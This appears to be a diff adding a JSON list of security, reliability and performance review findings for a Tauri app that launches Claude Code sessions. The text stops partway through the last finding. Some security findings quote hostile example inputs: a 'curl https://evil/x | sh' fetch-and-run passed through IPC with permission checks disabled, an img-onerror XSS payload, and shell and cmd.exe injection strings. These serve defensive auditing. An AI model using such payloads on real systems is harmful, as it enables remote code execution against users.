@@ -1,0 +1,826 @@
+[
+ {
+  "title": "pty_spawn is a generic 'run claude with any args, any cwd, any config dir' IPC primitive",
+  "severity": "high",
+  "where": "src-tauri/src/lib.rs:20-22, src-tauri/src/pty.rs:94-117,132-134",
+  "problem": "The backend trusts cwd, profile and args from the webview completely. Any script running in the webview (an XSS, a malicious dependency in the Vite bundle, a future feature that renders transcript markdown) can call invoke('pty_spawn',{cwd:'C:/', profile:'C:/attacker', args:['--dangerously-skip-permissions','-p','curl https://evil/x | sh'],...}) and get unattended code execution as the user, or point CLAUDE_CONFIG_DIR at an attacker-chosen folder (its settings.json hooks run arbitrary commands). The frontend only ever needs two shapes: new session (project path + profile) and resume (session id + profile).",
+  "fix": "Replace pty_spawn with two narrow commands: pty_new(project_path, profile_dir) and pty_resume(session_file). In Rust: (1) profile_dir must equal one of sessions::profiles() dirs (compare canonicalized paths); (2) cwd must be an existing directory (std::fs::metadata(..).is_dir()), ideally one of the project paths returned by projects(); (3) build args in Rust only: resume = vec![format!(\"--resume={id}\")] where id is the file stem of a session_file that lies under <profile>/projects/ and matches ^[0-9a-fA-F-]{36}$. Never accept a free-form args Vec from JS.",
+  "dimension": "security"
+ },
+ {
+  "title": "macOS login-shell launch: command string built by interpolation; shell_quote is wrong for fish/csh/nu",
+  "severity": "high",
+  "where": "src-tauri/src/pty.rs:101-105,123-129",
+  "problem": "The args are joined into a string run by `$SHELL -l -c`. The `'\\''` escaping is only correct for POSIX shells. If the user's SHELL is fish, a backslash inside single quotes escapes the quote, so an arg like \\';id;' becomes '\\'\\'';id;'\\''' and fish runs `id`. tcsh rejects -l combined with other flags and errors on newlines in quotes; nushell has different quoting entirely. Combined with the unvalidated args above (or a session file stem containing quotes), this is command injection; even with valid args the app is broken for fish/nu users.",
+  "fix": "Do not put args in the shell string. Option A (preferred): at startup run the login shell once only to get PATH, e.g. Command::new(\"/bin/zsh\").args([\"-l\",\"-c\",\"printf %s \\\"$PATH\\\"\"]) (always /bin/zsh or /bin/sh, not $SHELL), cache it, then spawn CommandBuilder::new(\"claude\") directly with cmd.env(\"PATH\", cached) and cmd.args(args). Option B: CommandBuilder::new(\"/bin/zsh\").args([\"-l\",\"-c\",\"exec claude \\\"$@\\\"\",\"claude\"]).args(args) so args are positional parameters, never parsed as code. Either way delete shell_quote.",
+  "dimension": "security"
+ },
+ {
+  "title": "CSP is null: any HTML injection becomes full IPC access (= code execution)",
+  "severity": "high",
+  "where": "src-tauri/tauri.conf.json:24-26",
+  "problem": "With csp:null the webview allows inline scripts, inline event handlers, eval and loads from any origin. Today every transcript-derived string goes through esc() (main.ts:146,160-166,241,249,266-267,480), so no live XSS was found, but one missed esc() on a transcript label/customTitle/summary/cwd (all attacker-influenced: a repo's README can make Claude set a title, a prompt pasted from the web becomes the label) would turn `<img src=x onerror=...>` into invoke('pty_spawn',...) = RCE.",
+  "fix": "Set \"csp\": \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; frame-src 'none'; form-action 'none'\" ('unsafe-inline' styles are needed for xterm's injected <style> and the style=\"height:0\" in main.ts:191). Also add \"devCsp\" if Vite HMR needs ws://localhost:1420. Tauri adds hashes/nonces for its own scripts automatically.",
+  "dimension": "security"
+ },
+ {
+  "title": "Unused opener plugin and permission widen the attack surface",
+  "severity": "medium",
+  "where": "src-tauri/capabilities/default.json:7, src-tauri/src/lib.rs:48, src-tauri/Cargo.toml:22, package.json:14",
+  "problem": "opener:default grants the webview open_url (http/https/mailto/tel) and reveal_item_in_dir, but the frontend never imports @tauri-apps/plugin-opener. A compromised page could open arbitrary URLs in the default browser or reveal paths without any feature needing it.",
+  "fix": "Remove \"opener:default\" from capabilities, the .plugin(tauri_plugin_opener::init()) line, the Cargo dependency and the npm package. If links are added later, add only opener:allow-open-url with an explicit https-only scope. Also replace core:default with the minimum (core:event:default is not used either; only core:app/core:window defaults that are actually needed).",
+  "dimension": "security"
+ },
+ {
+  "title": "Windows: if claude resolves to claude.cmd, args go through cmd.exe parsing (BatBadBut)",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:95-98 (portable-pty cmdbuilder.rs search_path/append_quoted)",
+  "problem": "portable-pty resolves 'claude' via PATH+PATHEXT and quotes args with MSVC argv rules only (it does not quote '&', '|', '^', '%'). For an npm-installed claude.cmd, CreateProcess runs it through cmd.exe, so an arg like `x&calc` (e.g. a session file named `x&calc.jsonl`, or any arg via the unvalidated IPC) runs calc. Also note search_path checks the extensionless npm `claude` sh shim first, which exists next to claude.cmd and is not a Win32 binary, so spawn can fail outright.",
+  "fix": "Resolve the executable in Rust: walk PATH looking for claude.exe first (native installer), then claude.cmd; pass the absolute path to CommandBuilder::new. If it is a .cmd/.bat, refuse any arg that does not match ^[A-Za-z0-9=_.:-]+$ (with the UUID validation above all real args pass), or run it as cmd.exe /d /s /c with fully escaped args. Never pass the bare name \"claude\".",
+  "dimension": "security"
+ },
+ {
+  "title": "API credentials from the launching environment leak into every profile",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:109-117",
+  "problem": "Only CLAUDECODE/CLAUDE_CODE_*/CLAUDE_CONFIG_DIR/NO_COLOR are stripped. If the manager is started from a shell (or a Claude Code session) with ANTHROPIC_API_KEY, ANTHROPIC_AUTH_TOKEN, ANTHROPIC_BASE_URL, AWS_*/CLAUDE_CODE_USE_BEDROCK-style vars set, every spawned session in every profile (work and personal) uses that key or endpoint instead of the profile's own login. Work traffic gets billed to or logged under the wrong account, and a stray ANTHROPIC_BASE_URL sends all prompts and the token to that host.",
+  "fix": "Also env_remove ANTHROPIC_API_KEY, ANTHROPIC_AUTH_TOKEN, ANTHROPIC_BASE_URL, ANTHROPIC_MODEL and CLAUDE_CODE_USE_BEDROCK/VERTEX (already covered by the CLAUDE_CODE_ prefix) unless the user opts in per profile. On macOS the login shell re-sources the user's rc files, so only strip what the GUI process inherited.",
+  "dimension": "security"
+ },
+ {
+  "title": "Resume id taken from the file name and passed as a separate arg; a crafted name becomes a flag",
+  "severity": "medium",
+  "where": "src/main.ts:377, src-tauri/src/sessions.rs:328",
+  "problem": "Session.id is the raw file stem. A file named `--dangerously-skip-permissions.jsonl` (or `-p`...) under ~/.claude*/projects/ produces args ['--resume','--dangerously-skip-permissions']; commander treats the second as an option, so clicking that session launches claude with permission checks off. Precondition is write access to the profile folder (e.g. a sync tool, a shared machine, or a tool Claude itself ran).",
+  "fix": "In sessions.rs skip files whose stem does not match a UUID (^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$), and build the arg as one token `--resume=<id>` in Rust (see the pty_resume fix).",
+  "dimension": "security"
+ },
+ {
+  "title": "Terminal OSC 8 hyperlinks and window.open are not controlled",
+  "severity": "low",
+  "where": "src/main.ts:384-394",
+  "problem": "xterm.js handles OSC 8 links by default with confirm() + window.open(uri). Terminal output can contain text from untrusted repos/web pages; a link to file://, a custom URL scheme or a lookalike https URL opens a new webview window or an OS handler. No on_new_window/on_navigation guard exists in lib.rs.",
+  "fix": "Pass linkHandler: { activate: (_e, uri) => { if (/^https:\\/\\//i.test(uri)) openUrl(uri) }, allowNonHttpProtocols: false } to new Terminal(...) (re-adding a scoped opener permission), and in Rust add WebviewWindowBuilder .on_navigation(|url| url.scheme()==\"tauri\" || url.host_str()==Some(\"localhost\")) plus deny new windows (on_new_window returning Deny).",
+  "dimension": "security"
+ },
+ {
+  "title": "Transcript reader buffers an unbounded line and follows symlinks",
+  "severity": "low",
+  "where": "src-tauri/src/sessions.rs:340-377, 250-256",
+  "problem": "A .jsonl with a multi-GB line and no newline is accumulated fully in `pending` and then parsed by serde_json, which can exhaust memory; with panic=\"abort\" (Cargo.toml) the whole app and all live terminals die. read_dir also follows symlinked ~/.claude-* dirs and project folders anywhere on disk.",
+  "fix": "Cap `pending` (e.g. drop lines over 8 MB and only scan them with the cheap contains() checks), and skip entries where e.file_type()?.is_symlink().",
+  "dimension": "security"
+ },
+ {
+  "title": "Release pipeline: unsigned builds and unpinned third-party actions",
+  "severity": "low",
+  "where": ".github/workflows/build.yml:21-53",
+  "problem": "tauri-apps/tauri-action@v0, pnpm/action-setup@v4, swatinem/rust-cache@v2, dtolnay/rust-toolchain@stable are referenced by mutable tags; a compromised tag injects code into the shipped installer. No `permissions:` block, so GITHUB_TOKEN has default write scope. Binaries are unsigned (users are told to bypass Gatekeeper/SmartScreen, which trains them to accept unsigned lookalikes).",
+  "fix": "Pin every action to a full commit SHA, add top-level `permissions: contents: read`, and add Apple Developer ID signing + notarization (APPLE_CERTIFICATE, APPLE_ID, APPLE_TEAM_ID secrets to tauri-action) and Windows Authenticode signing (bundle.windows.certificateThumbprint or signCommand) before calling it production.",
+  "dimension": "security"
+ },
+ {
+  "title": "Windows: child exit is never detected, so tabs never show 'session ended'",
+  "severity": "blocker",
+  "where": "src-tauri/src/pty.rs:83-104",
+  "problem": "Exit is only reported when the reader hits EOF. On ConPTY the output pipe stays open after the child exits, for as long as the pseudoconsole (Term.master) is alive (microsoft/terminal#4564). Term.master is only dropped in kill(), so on Windows a /exit or a crash never sends Exit. The tab stays 'running', closing it still needs two clicks, resume() at main.ts:375 jumps to the dead tab instead of starting a new one, and refresh() is not run on exit. The same thing happens on macOS whenever a grandchild still holds the slave fd, for example a background process or MCP server that Claude started.",
+  "fix": "After spawn, call `let killer = child.clone_killer();`, keep the killer in Term, and move `child` into a waiter thread: `let code = child.wait().ok().map(|s| s.exit_code()); terms.remove(id); on_event.send(PtyEvent::Exit{code})`. Removing the entry drops the master, which closes the pseudoconsole and gives the reader EOF. The waiter needs an Arc<Terms> or an AppHandle to remove the entry. Have the reader thread send only Data, and let the waiter thread alone own Exit, with the real exit code.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Exited terminals are never removed from the map (handle/ConPTY/zombie leak)",
+  "severity": "high",
+  "where": "src/main.ts:334; src-tauri/src/pty.rs:106,123-127",
+  "problem": "closeTab calls pty_kill only when !tab.exited. For a tab whose child already exited, the Term (master, writer, child, and on Windows the conhost.exe plus pipes) stays in Terms.map until the app quits. On macOS the exited child is never wait()ed, so it stays a zombie for the whole app lifetime.",
+  "fix": "Have closeTab always call invoke('pty_kill', {id}) when ptyId !== null. Also remove and reap the entry in the backend when the child exits (the waiter thread from the first finding calls child.wait(), which reaps it).",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Killing claude leaves its child processes running (node, MCP servers, Bash tool shells)",
+  "severity": "high",
+  "where": "src-tauri/src/pty.rs:123-133",
+  "problem": "child.kill() ends only the direct child. On Windows that is TerminateProcess on claude.exe, or on cmd.exe when claude resolves to the npm claude.cmd shim, which also shows 'Terminate batch job (Y/N)?' on Ctrl+C. Node, MCP servers and tool shells it started become orphans. On macOS the direct child is the login shell after exec. portable-pty sends SIGHUP and then SIGKILL to that one pid only, so processes in other groups survive. If the app crashes, nothing is cleaned up.",
+  "fix": "Windows: create a Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE when the app starts (windows-sys crate) and AssignProcessToJobObject(child pid) right after spawn. Child processes then die on kill and also when the app crashes. Unix: portable-pty calls setsid(), so the pgid equals the child pid. Run libc::killpg(pid, SIGHUP), wait briefly, then killpg(pid, SIGKILL).",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Sync PTY commands run on the main thread and hold one global lock while blocking",
+  "severity": "high",
+  "where": "src-tauri/src/lib.rs:19-43; src-tauri/src/pty.rs:110-133",
+  "problem": "Non-async Tauri commands run on the main (UI) thread. pty_write runs write_all while holding the global map Mutex. If ConPTY or the PTY input buffer is full (a large paste, or a child that is not reading), the UI thread and every other terminal freeze. On Unix, portable-pty's kill() sleeps for up to about 250 ms (SIGHUP grace loop) while the map lock is held, and kill_all does this for every tab, so quitting with 10 tabs can block for about 2.5 s. Dropping Term (ClosePseudoConsole) also happens inside the lock.",
+  "fix": "Store terminals as HashMap<u32, Arc<Term>> with separate Mutexes for the writer and the master. Clone the Arc, release the map lock, then do the I/O. Better: give each terminal a writer thread fed by an mpsc::Sender<Vec<u8>>, so pty_write only does tx.send() and never blocks. Make pty_kill and pty_kill_all async or spawn_blocking. Remove entries from the map first and kill or drop them outside the lock.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Closing a tab before pty_spawn resolves leaves an orphaned claude running",
+  "severity": "high",
+  "where": "src/main.ts:447-448, 334",
+  "problem": "openTerminal awaits pty_spawn. If the user closes the tab during that wait (the macOS login shell can be slow), closeTab sees ptyId === null and skips the kill. When the spawn then resolves, the tab is set to closing or already disposed, but the process keeps running with no tab until the app quits. The pending flush also writes to a disposed tab.",
+  "fix": "After the await: `if (tab.closing) { invoke('pty_kill', {id: tab.ptyId}); return; }` before flushing pending. Also check tab.closing (or a disposed flag) in ch.onmessage before calling term.write, because data can still arrive after term.dispose() at main.ts:361.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Terminals are not killed when the app quits via Cmd+Q / app exit",
+  "severity": "high",
+  "where": "src-tauri/src/lib.rs:51-57",
+  "problem": "kill_all runs only on WindowEvent::Destroyed. On macOS, Cmd+Q or Quit from the Dock exits through RunEvent::ExitRequested/Exit, and the window Destroyed event is not guaranteed to fire before the process ends. Children then survive or receive only SIGHUP from the closed master.",
+  "fix": "Use `let app = Builder...build(ctx)?; app.run(|h, ev| if let RunEvent::Exit = ev { h.state::<Terms>().kill_all() })`, and keep the Destroyed hook too. Together with the Job Object and killpg fixes, this covers every way the app can exit.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Reader thread stops draining when the channel fails; on Windows 10, ClosePseudoConsole can then hang",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:99-101",
+  "problem": "The reader breaks as soon as on_event.send fails, for example when the webview is gone during shutdown. On Windows before 11 24H2, ClosePseudoConsole blocks until the output pipe is drained. A later kill_all in the Destroyed handler, which drops the master, can therefore hang the app on exit.",
+  "fix": "Do not break on a send error. Set a flag and keep reading and discarding until read() returns 0 or Err. Alternatively, drop the master on a separate thread so a hang cannot block the UI or exit.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "No flow control: heavy output floods IPC and xterm memory",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:86-101; src/main.ts:438",
+  "problem": "Every read, up to 64 KB, becomes one JSON IPC message without any backpressure. term.write is not throttled either. Resuming a large session or a burst of output (for example cat of a huge file) can queue hundreds of MB in the webview and freeze rendering. Hidden tabs keep receiving and parsing output at full speed.",
+  "fix": "In the backend, merge reads into one send about every 8-16 ms. In the frontend, count bytes still waiting in term.write(data, cb). Above a high watermark (around 1 MB), call a new pty_pause command that makes the reader thread block on a Condvar, and resume below the low watermark. Option: send raw bytes as Channel<Vec<u8>>/InvokeResponseBody::Raw and decode with xterm's write(Uint8Array). This removes the server-side UTF-8 carry logic too.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Claude's animated terminal title rebuilds the whole tab strip many times a second",
+  "severity": "medium",
+  "where": "src/main.ts:429-434, 261-276",
+  "problem": "Claude Code updates the terminal title constantly while it works (spinner frames). Each update calls renderTabs(), which replaces all tab elements with innerHTML. When mousedown and mouseup land on different DOM nodes the click is lost, so clicks on tabs or the close button sometimes do nothing. Hover state flickers, and the pill and entrance animations get recalculated with every update.",
+  "fix": "In onTitleChange, update the existing node in place: `el.tabList.querySelector(`.tab[data-key=\"${tab.key}\"] .t-title`)!.textContent = tab.title`. Call renderTabs only for structural changes (open, close, active tab, exited, armed). Throttle title updates to about 4 per second.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Un-awaited pty_write invokes can arrive out of order; errors are unhandled",
+  "severity": "medium",
+  "where": "src/main.ts:426, 428, 448",
+  "problem": "Each keystroke and resize is a separate invoke that is never awaited. Tauri v2 IPC uses separate custom-protocol requests, which do not guarantee order once the commands become async (needed for the main-thread finding above). Fast typing or pastes can then be reordered. Rejections (for example 'no such terminal' after exit) become unhandled promise rejections and are never shown in the UI.",
+  "fix": "Chain writes per tab: `tab.q = tab.q.then(() => invoke('pty_write', {...})).catch(markDead)`. Better still, use the backend writer queue and batch keystrokes in one microtask. Surface failures: mark the tab exited and print the error into the terminal.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Session-list load errors are swallowed; the UI shows 'Loading sessions...' forever",
+  "severity": "medium",
+  "where": "src/main.ts:118-126, 153, 479",
+  "problem": "refresh() only logs errors to the console. If list_projects fails, or no profile has a projects/ folder, projects stays [] and the sidebar keeps showing 'Loading sessions...'. If list_profiles rejects, the DOMContentLoaded handler throws: refresh, the 15 s interval and the focus listener are never set up, so the app looks dead.",
+  "fix": "Keep a `loadState: 'loading'|'ok'|'empty'|'error'`. Show 'No Claude Code sessions found in ~/.claude*' for an empty result and the error text plus a Retry button on failure. Wrap list_profiles in try/catch and still start refresh and the interval.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Overlapping refresh() calls run parallel full scans and can apply stale results",
+  "severity": "medium",
+  "where": "src/main.ts:118, 487-488; src-tauri/src/sessions.rs:98-106",
+  "problem": "The 15 s interval and window focus each start list_projects even while a scan is still running. Every call starts up to 8 threads that re-read every .jsonl file. A slower, older result can finish last and overwrite a newer one. Each refresh also replaces the sidebar innerHTML, which breaks an expand or collapse animation in toggleProject (it animates a node that has been detached).",
+  "fix": "Guard with a flag: `if (inflight) { again = true; return; }`, and run once more after it finishes. Use a sequence number and ignore results that are not the newest. Skip renderSidebar while a group animation is running, or compare the JSON and re-render only when the data changed.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "STATES cache grows without bound and stores full first prompts",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:52, 181, 198-201",
+  "problem": "STATES is never pruned, so entries for deleted or moved transcripts live forever. ParseState.prompt keeps the whole first user message, which can be several MB for pasted logs or files, once per session. Every scan also clones that state twice (get().cloned(), then insert(st.clone())).",
+  "fix": "Truncate the prompt and title to about 200 chars at parse time (only 140 are shown). At the end of projects(), call `STATES.lock().retain(|k, _| seen.contains(k))`. Skip opening the file when meta.len() == st.offset and mtime has not changed.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Spawn failures give unclear errors; a child is leaked when post-spawn setup fails",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:75-80",
+  "problem": "If the session's cwd was deleted, spawn fails with 'The directory name is invalid' on Windows or a bare 'No such file or directory' on Unix. A missing claude on PATH has the same Unix error. If try_clone_reader or take_writer fails after spawn_command succeeded, the `?` returns while the child is still running and not tracked in the map.",
+  "fix": "Before spawning, check that the cwd exists (`Path::new(cwd).is_dir()`) and return a clear error ('folder no longer exists: ...'). Clone the reader and take the writer before spawn_command, or call child.kill() and wait() on those error paths. On Windows, check for claude on PATH (which-style PATHEXT search) and say 'claude not found on PATH' when it is missing.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "macOS: GUI-launched PTY lacks a UTF-8 locale and may use the wrong shell",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:41-48, 60-61",
+  "problem": "Apps started from Finder get no LANG/LC_CTYPE, and zsh -l does not set them. Tools that Claude runs (git, less, python) then fall back to the C locale and print mangled non-ASCII text. SHELL may be missing from the launchd environment. If so the code falls back to /bin/zsh, ignoring the user's actual login shell.",
+  "fix": "If LANG is unset, set `cmd.env(\"LANG\", \"en_US.UTF-8\")`, as Terminal.app does. Read the shell from getpwuid(getuid()).pw_shell (libc) instead of only $SHELL. Also set TERM_PROGRAM=ClaudeManager.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "Hard-coded ConPTY build number for xterm",
+  "severity": "low",
+  "where": "src/main.ts:393",
+  "problem": "windowsPty.buildNumber is fixed at 19045. On Windows 11 (build 22000 and later) xterm then applies the old ConPTY reflow and wrap heuristics, so resized output wraps wrongly. On older builds it assumes features they do not have.",
+  "fix": "Add a backend command that returns the real OS build (for example via the os_info crate or RtlGetVersion) and pass it to windowsPty.buildNumber.",
+  "dimension": "reliability"
+ },
+ {
+  "title": "UTF-8 carry corrupts a split character when the chunk also has invalid bytes",
+  "severity": "low",
+  "where": "src-tauri/src/pty.rs:92-98",
+  "problem": "When the buffer has an invalid byte earlier and an incomplete multi-byte sequence at the end, error_len() is Some for the first error, so the whole buffer is lossy-decoded and the incomplete trailing sequence becomes U+FFFD.",
+  "fix": "Decode in a loop: replace each invalid sequence and continue, keeping only a trailing incomplete sequence (error_len()==None) in carry. Or send raw bytes and let xterm decode them (see the flow-control finding).",
+  "dimension": "reliability"
+ },
+ {
+  "title": "panic = abort turns any parser or thread panic into an app crash with no message",
+  "severity": "low",
+  "where": "src-tauri/Cargo.toml:28; src-tauri/src/sessions.rs:105",
+  "problem": "With panic=abort in release, a panic in a session-scan worker (unwrap_or_default on join never runs), in the PTY reader, or in a lock().unwrap() kills the whole app and every running claude session. Nothing is logged.",
+  "fix": "Use panic = 'unwind' (scan threads already handle join errors), or add std::panic::set_hook that writes to a log file under the app's log dir (tauri-plugin-log). Replace .lock().unwrap() with .lock().unwrap_or_else(|e| e.into_inner()).",
+  "dimension": "reliability"
+ },
+ {
+  "title": "A stale project or session click can throw",
+  "severity": "low",
+  "where": "src/main.ts:201-203, 225, 255",
+  "problem": "After a refresh, a clicked element can refer to a project or session that no longer exists. `projects.find(...)!` returns undefined, and newSession or resume then throws a TypeError on p.path or s.id.",
+  "fix": "Check for a missing result and return early (`const p = find(...); if (!p) return;`), then call renderSidebar().",
+  "dimension": "reliability"
+ },
+ {
+  "title": "First scan re-reads every transcript on every app start (no persisted cache)",
+  "severity": "high",
+  "where": "src-tauri/src/sessions.rs:52, 148-186",
+  "problem": "STATES (the offset/field cache) is in memory only, so each launch reads every byte of every .jsonl file before the sidebar shows anything. On this machine that is 126 files and 309 MB, and the largest file is 92 MB. Startup time therefore grows with total history size. The sidebar stays on 'Loading sessions...' until the slowest file finishes.",
+  "fix": "Save STATES to app_cache_dir()/sessions-cache.json (path -> {len, mtime_ms, offset, cwd, prompt, title, summary, count}), using serde with a version field. Load it in projects() on the first call, and write it back after each scan only if something changed. On startup only the bytes added since the last run get read. Expected gain: a warm start goes from roughly 1-3 s (reading 309 MB) to tens of ms (126 stat calls plus a small JSON file).",
+  "dimension": "performance"
+ },
+ {
+  "title": "Cold scan should come in two phases: header first, counts later",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:129-145, src-tauri/src/lib.rs:15-17",
+  "problem": "Even with a persisted cache, the first run and any new large transcript are blocked on a full read, only to get `count`. cwd and the first prompt are in the first few KB of a file. Only count (and a custom-title appended later) needs the whole file.",
+  "fix": "Add a fast path. For files not in the cache, read only the first 64 KB to get cwd and prompt, and return the list with count = null. Then run the full count pass in the background and push results with app.emit(\"sessions-updated\", ...) or a Channel. The frontend can show '…' for count until it arrives. Expected gain: first paint on a cold start reads about 126 x 64 KB = 8 MB instead of 309 MB, which is more than 30x less I/O.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Line scanning is byte-by-byte and makes several full passes over large lines",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:164-177, 189-211",
+  "problem": "Newlines are found with a scalar `for i in 0..n` loop. Then each line is scanned again by `contains(\"\\\"type\\\":\\\"user\\\"\")`, `contains(\"\\\"tool_result\\\"\")`, `contains(\"\\\"cwd\\\":\\\"\")`, `contains(\"\\\"isMeta\\\":true\")` and the two starts_with checks. Tool-result lines are often hundreds of KB to several MB, so each byte is read 3-4 times. from_utf8_lossy also allocates a copy whenever a line contains invalid UTF-8.",
+  "fix": "Add the `memchr` crate. Find newlines with memchr::memchr_iter(b'\\n', &buf[..n]). Build static memmem::Finder values once for each needle and run them on &[u8] directly, without converting to str first. Only lines that need JSON parsing (prompt/title/summary candidates) should go through from_utf8. Since `type` and the start of `content` come before the payload, limit the type/tool_result checks to the first ~4 KB of each line (line[..min(len,4096)]). Expected gain: 3-10x faster CPU scan, so the scan becomes limited by disk I/O.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Static chunking leaves one thread doing the 92 MB file while the others sit idle",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:98-106",
+  "problem": "`files.chunks(chunk)` splits work by file count, not by size. One chunk can hold the 92 MB file plus several others while the other threads finish in milliseconds. The total time is then set by the slowest chunk.",
+  "fix": "Sort files by metadata length, largest first. Share an AtomicUsize index across the 8 scoped threads so each thread takes the next file (work stealing), or use rayon's par_iter. Expected gain: the cold scan approaches total_bytes / threads instead of the size of the largest chunk. With these sizes, that is about 1.5-2x faster.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Each refresh opens every file and zeroes a 1 MB buffer even when nothing changed",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:149-155",
+  "problem": "read_lines always calls File::open, then seek, then `vec![0u8; 1 << 20]`. For 126 files every 15 s, that is about 126 MB of memset and 126 open/close calls per refresh with no new data. For a heavy user with thousands of sessions, this costs CPU and battery all the time.",
+  "fix": "Check `if len == st.offset` (and mtime is unchanged) right after the cache lookup, and return the cached state before opening the file. Also cache the built Session in STATES so label and whitespace processing are not redone. Use a thread_local 256 KB buffer instead of allocating 1 MB for each file. Expected gain: refreshes with no changes drop to stat-only, under 5 ms.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Polling every 15 s plus on each focus, with no in-flight guard and no visibility check",
+  "severity": "medium",
+  "where": "src/main.ts:118-126, 443, 487-488",
+  "problem": "refresh runs on setInterval(15000), on every window `focus` event, and on every PTY exit. Nothing stops two refreshes from overlapping: focus and the timer can fire together, and each runs a separate spawn_blocking scan. Polling also continues while the window is minimized or hidden.",
+  "fix": "Add an in-flight flag: `let busy: Promise<void>|null`, and return the existing promise if one is pending. Skip the timer tick when document.hidden is true. Better still, drop polling: watch each <profile>/projects directory with the `notify` crate (notify-debouncer-mini, 300 ms) in Rust. Rescan only the changed paths and emit 'projects-changed' to the frontend. Expected gain: zero work while idle, and updates appear in under 1 s instead of up to 15 s.",
+  "dimension": "performance"
+ },
+ {
+  "title": "list_projects sends the full session list every time and rebuilds the whole DOM",
+  "severity": "medium",
+  "where": "src-tauri/src/sessions.rs:12-32, src/main.ts:118-126, 150-170, 234-258",
+  "problem": "Each refresh serializes every Session (id, file path, cwd, label up to 140 characters, profile path), currently about 450 B x 126, or about 57 KB. For heavy users with 5k sessions this grows to megabytes. The frontend then re-parses the JSON and replaces el.list.innerHTML and el.home.innerHTML even when nothing changed. renderHome also renders every session of the selected project with no limit, while the sidebar caps at 30. All of this causes garbage-collection churn, layout work and lost hover state every 15 s.",
+  "fix": "(1) Keep a generation counter in Rust that increases only when some session changed. Have list_projects(since_gen) return `{gen, projects: null}` when nothing changed, and skip rendering on the frontend. (2) Trim the payload. Remove `file`, since the frontend only uses it as a key and can use `id`. Remove the per-session `cwd`, which duplicates project.path, and add it back only when it differs. Send `profile` as an index into list_profiles. That is about 40% fewer bytes. (3) In renderHome, render the first 200 rows and add a 'show more' row, or use a simple virtual list. Expected gain: almost no IPC or DOM cost on refreshes with no changes.",
+  "dimension": "performance"
+ },
+ {
+  "title": "pty_write and pty_spawn are sync commands that block the main thread, and pty_write holds a global lock during blocking I/O",
+  "severity": "high",
+  "where": "src-tauri/src/lib.rs:19-27, src-tauri/src/pty.rs:110-115",
+  "problem": "In Tauri 2, a non-async #[tauri::command] runs on the main (UI) thread. Terms::write calls write_all and flush while holding the single `map` Mutex. If the child is not reading stdin (Claude is busy, or a large paste fills the ConPTY input buffer), the write blocks. That freezes the window and also blocks write, resize and kill for every other tab. pty_spawn also runs openpty plus process creation on the UI thread, which takes 50-300 ms on ConPTY.",
+  "fix": "Make pty_spawn, pty_write and pty_resize `async fn` so they run on the async runtime. Store each Term's writer as Arc<Mutex<Box<dyn Write+Send>>>. In write, clone the Arc while holding the map lock, release the map lock, then write. Better: give each terminal a writer thread fed by an std::sync::mpsc::Sender<Vec<u8>>, so pty_write only does a non-blocking send. Expected gain: the UI never stalls on terminal input or tab creation, and one slow tab cannot block the others.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Terminal output is sent as one JSON-escaped String per read",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:12-17, 83-104; src/main.ts:436-438",
+  "problem": "Each reader.read() becomes one Channel message containing a JSON-serialized `{kind:'data',data:String}`. ANSI escapes (\\u001b becomes 6 bytes) and quotes grow the payload by roughly 1.3-2x for TUI output. ConPTY returns many small reads (a few hundred bytes each) while Claude repaints, so a busy tab sends hundreds of IPC messages per second, each with JSON encode and decode. The UTF-8 carry logic is also extra work, because xterm already decodes UTF-8 from bytes.",
+  "fix": "Switch the data stream to `Channel<tauri::ipc::InvokeResponseBody>` and send `InvokeResponseBody::Raw(bytes)`. JS then receives an ArrayBuffer, and you call term.write(new Uint8Array(buf)). Remove the carry/from_utf8 code. Report exit on a second Channel or with app.emit. Coalesce in the reader: after the first read, keep collecting for up to ~4 ms or 64 KB (a second thread with mpsc::recv_timeout, or a non-blocking read loop) before sending. Expected gain: 5-20x fewer IPC messages under bursty output, no JSON escaping, and noticeably smoother scrolling and repaints.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Exited sessions are never removed from Terms, which leaks ConPTY/conhost and PTY handles",
+  "severity": "high",
+  "where": "src/main.ts:334, src-tauri/src/pty.rs:83-106, 123-127",
+  "problem": "closeTab only calls pty_kill when `!tab.exited`. When claude exits on its own, the reader thread ends but the Term (master, writer, child) stays in the map until the app quits. On Windows, each one keeps a ConPTY open, so a conhost.exe process (about 5-10 MB) stays alive. On macOS, a PTY fd stays open and the child is never reaped, leaving a zombie. Long sessions with many resume/exit cycles keep piling these up. kill() also never calls child.wait().",
